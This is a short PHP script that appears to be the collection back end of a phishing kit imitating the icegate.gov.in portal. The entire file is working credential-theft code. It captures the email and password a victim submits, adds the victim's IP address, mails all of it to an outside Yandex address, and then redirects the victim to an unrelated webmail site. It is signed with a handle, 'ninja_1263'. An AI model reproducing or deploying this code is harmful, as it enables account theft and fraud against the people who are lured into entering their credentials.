<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------- Mail--------------------------------\n";
$message .= "Email: ".$_POST['user']."\n";
$message .= "Password:: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------Created By ninja_1263---------------------\n";
$send = "princedclogin@yandex.com";
$subject = "icegate.gov.in";
$headers = "From: Voyage<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location:  http://webmail.hisaka-me.com/?locale=en");
	  

?>